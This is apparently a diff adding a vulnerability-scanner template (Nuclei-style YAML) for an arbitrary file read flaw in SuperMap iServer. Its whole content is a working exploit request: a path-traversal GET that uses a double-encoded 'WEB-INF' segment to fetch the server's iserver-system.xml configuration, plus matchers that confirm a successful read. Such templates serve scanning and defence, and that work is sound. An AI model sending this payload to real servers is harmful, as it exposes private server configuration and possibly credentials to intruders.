@@ -1,0 +1,26 @@
+id: beijingchaotu-iserver-File-reading
+
+info:
+  name: 北京超图软件 iserver 任意文件读取漏洞
+  author: xxx
+  severity: high
+  tags: File reading
+
+http:
+  - raw:
+      - |
+        GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '<?xml version='
+          - '<properties>'
+          - '<management>'
+        condition: and
+      - type: status
+        status: 
+          - 200
